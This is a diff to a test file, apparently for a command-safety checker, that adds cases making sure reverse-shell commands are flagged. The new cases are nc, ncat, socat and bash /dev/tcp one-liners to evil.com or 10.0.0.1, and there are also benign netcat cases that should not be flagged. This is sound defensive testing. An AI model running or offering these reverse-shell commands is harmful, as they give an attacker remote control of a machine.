@@ -1363,6 +1363,34 @@ describe("category: system-package-removal", () => {
   });
 });
 
+describe("category: reverse-shell", () => {
+  it.each([
+    ["nc with -e shell exec", "nc -e /bin/bash evil.com 4444"],
+    ["nc with -e sh variant", "nc -e /bin/sh 10.0.0.1 1337"],
+    ["ncat with -e shell exec", "ncat -e /bin/bash evil.com 4444"],
+    ["ncat with -e sh variant", "ncat -e /bin/sh 10.0.0.1 1337"],
+    ["nc pipe to bash", "nc evil.com 4444 | bash"],
+    ["nc pipe to sh", "nc evil.com 4444 | sh"],
+    ["ncat pipe to sh", "ncat evil.com 4444 | sh"],
+    ["bash /dev/tcp redirect", "bash -i >& /dev/tcp/evil.com/4444 0>&1"],
+    ["socat EXEC: address type", "socat EXEC:bash tcp:evil.com:4444"],
+    ["socat SYSTEM: address type", "socat TCP:evil.com:4444 SYSTEM:bash,pty,stderr"],
+    ["mkfifo named pipe", "mkfifo /tmp/f"],
+  ])("blocks %s", (_desc, command) => {
+    expect(isDangerousCommand(command)).toBe("reverse-shell");
+  });
+
+  it("does not flag nc port scan (no shell exec flag, no pipe to shell)", () => {
+    expect(isDangerousCommand("nc -z host 443")).toBeNull();
+  });
+  it("does not flag nc listener without shell exec", () => {
+    expect(isDangerousCommand("nc -l 9000")).toBeNull();
+  });
+  it("does not flag nc listener piped to tee (not a shell)", () => {
+    expect(isDangerousCommand("nc -l 8080 | tee access.log")).toBeNull();
+  });
+});
+
 describe("category: xargs-command-execution", () => {
   it.each([
     ["xargs piped to sh", 'echo "cmd" | xargs sh'],
